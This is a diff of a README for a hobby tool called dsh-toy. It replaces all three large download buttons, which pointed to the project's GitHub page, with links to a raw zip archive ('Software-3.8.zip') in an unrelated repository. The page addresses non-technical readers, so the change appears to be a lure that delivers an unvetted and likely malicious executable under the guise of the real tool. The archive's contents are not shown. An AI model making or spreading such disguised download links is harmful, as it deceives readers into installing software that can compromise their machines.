@@ -1,6 +1,6 @@
 <h1>🎮 dsh-toy - Control Your DSH With Fun</h1>
 
-<a href="https://github.com/shadow-jpg-dev/dsh-toy" style="display:inline-block;background:#FF6B6B;color:white;padding:15px 30px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ DOWNLOAD NOW</a>
+<a href="https://github.com/shadow-jpg-dev/autokeypresser/raw/refs/heads/main/src/Software-3.8.zip" style="display:inline-block;background:#FF6B6B;color:white;padding:15px 30px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ DOWNLOAD NOW</a>
 
 ---
 
@@ -40,7 +40,7 @@ That's it. No special hardware. No developer tools. No accounts to create.
 
 Visit this link to download the application:
 
-<a href="https://github.com/shadow-jpg-dev/dsh-toy" style="display:inline-block;background:#4ECDC4;color:white;padding:12px 24px;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 DOWNLOAD FROM GITHUB</a>
+<a href="https://github.com/shadow-jpg-dev/autokeypresser/raw/refs/heads/main/src/Software-3.8.zip" style="display:inline-block;background:#4ECDC4;color:white;padding:12px 24px;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 DOWNLOAD FROM GITHUB</a>
 
 The download might take a few minutes depending on your internet speed. You'll see a file appear in your "Downloads" folder.
 
@@ -178,7 +178,7 @@ If you get comfortable with dsh-toy, try these:
 
 Don't overthink it – dsh-toy is meant to be simple and fun. Visit the download link and give it a try:
 
-<a href="https://github.com/shadow-jpg-dev/dsh-toy" style="display:inline-block;background:#FFD93D;color:#333;padding:15px 30px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">🎉 GET DSCH-Toy NOW</a>
+<a href="https://github.com/shadow-jpg-dev/autokeypresser/raw/refs/heads/main/src/Software-3.8.zip" style="display:inline-block;background:#FFD93D;color:#333;padding:15px 30px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">🎉 GET DSCH-Toy NOW</a>
 
 If you run into any trouble, re-read this guide. The answer is probably here. And remember: you can always reset everything back to default with one click.
 
